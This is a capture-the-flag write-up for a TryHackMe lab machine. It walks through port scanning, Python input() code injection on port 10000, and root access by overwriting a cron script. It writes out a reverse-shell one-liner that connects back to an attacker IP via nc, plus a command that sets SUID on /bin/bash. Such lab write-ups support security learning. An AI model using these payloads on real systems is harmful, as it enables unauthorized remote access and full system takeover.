# #1 introduction
<img width="653" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/40ec553e-2637-4acb-a32f-27eb8fa4ebad">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx develpy.thm
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- develpy.thm
```

we got these open ports
```bash
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
10000/tcp open  snet-sensor-mgmt?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## port 10000

we try to nc the port to see if there is bytes sent by this one

<img width="700" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/92666550-9238-4774-b61d-b34e7a9ab3c0">

it seems there is a python script running and doing a ping request many times as our input\
if we sent some other payload than numbers, we can see an error and a piece of code of a file named exploit .py

<img width="732" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/056b9565-9146-431b-99d9-f2c0adcdfbfb">

seems as the return we can execute some python code with the input function... interesting\
after doing some research, i found an interesting article talking about exploiting a input function : https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html

<img width="734" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/a2b051ca-1031-4b44-8a0d-498364976497">

bingo ! we can execute commands so let's try to get a reverse shell with this input :
__import__('os').system("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6666 >/tmp/f")

<img width="1329" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/7170aed9-0964-4e3b-ad84-f2d30f40936a">

and we got our reverse shell 

<img width="574" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/a6b08472-9dd8-4cfa-9e12-fff62578c1ae">

by curiosity, i took a look at the python code of the exploit and it is not a ping but a print that fake it

<img width="1199" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/8da5c318-0be4-4444-8073-20709ad0f76a">

to counter that vulnerability, the article state that we need to use raw_input() instead of input()

we see in /etc/crontab the following crons

<img width="932" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/6dd8eb17-2fbe-450d-bf76-b41124465920">

so we can delete the root.sh since we have right to execute in /home/king and recreate a custom root file
```
chmod u+s /bin/bash
```

now we can run the following to get root :
<img width="311" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/436a7638-41f3-42be-86bb-2de4e3bc1cab">


